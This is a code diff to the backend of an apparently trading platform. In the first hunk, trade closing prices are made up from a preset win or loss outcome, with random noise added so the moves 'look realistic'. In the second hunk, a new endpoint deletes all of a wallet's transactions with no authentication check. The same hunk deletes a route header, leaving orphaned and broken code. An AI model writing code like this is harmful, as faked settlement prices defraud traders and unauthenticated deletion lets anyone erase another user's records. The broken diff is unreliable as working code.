@@ -583,21 +583,32 @@ async function finalizeTradeSettlement({ trade, clientClosingPrice = null, clien
     // Otherwise, use the entryPrice.
     let baselinePrice = (parsedClientPrice && parsedClientPrice > 0) ? parsedClientPrice : entryPrice;
     
-    // We add/subtract a small random delta to make the move look realistic 
+    // We set a fixed delta based on duration to mimic realistic price action.
+    let delta = 0;
+    if (trade.duration <= 30) {
+        delta = 2;
+    } else if (trade.duration <= 60) {
+        delta = 5;
+    } else {
+        delta = 50;
+    }
+    
+    // We add/subtract a small random variation to make the move look realistic 
     // when not explicitly set by admin or client.
-    const deltaPercent = (0.20 + Math.random() * 0.35) / 100;
+    const variation = Math.random() * (delta * 0.1);
+    const finalDelta = delta + variation;
     
     let closingPrice;
     if (isLong) {
       // For Long: Win = price goes up, Loss = price goes down
       closingPrice = isWin 
-        ? baselinePrice * (1 + deltaPercent) 
-        : baselinePrice * (1 - deltaPercent);
+        ? entryPrice + finalDelta
+        : entryPrice - finalDelta;
     } else {
       // For Short: Win = price goes down, Loss = price goes up
       closingPrice = isWin 
-        ? baselinePrice * (1 - deltaPercent) 
-        : baselinePrice * (1 + deltaPercent);
+        ? entryPrice - finalDelta
+        : entryPrice + finalDelta;
     }
 
     const decimals = entryPrice < 1 ? 6 : (entryPrice < 100 ? 4 : 2);
@@ -1607,8 +1618,18 @@ apiRouter.get('/trade-details', async (req, res) => {
   }
 });
 
-// ─── Transactions ──────────────────────────────────────────────────────────
-apiRouter.get('/user/transactions', async (req, res) => {
+apiRouter.post('/user/transactions/delete-all', async (req, res) => {
+  const { address } = req.body;
+  if (!address) return res.status(400).json({ error: 'Address required' });
+  if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
+  try {
+    await pool.query('DELETE FROM transactions WHERE wallet_address = $1', [address]);
+    res.json({ success: true });
+  } catch (e) {
+    console.error('[API Error] /user/transactions/delete-all:', e.message);
+    res.status(500).json({ error: e.message });
+  }
+});
   const { address, limit } = req.query;
   if (!address) return res.status(400).json({ error: 'Address required' });
   if (!dbAvailable || !pool) return res.status(503).json({ error: 'Database unavailable' });
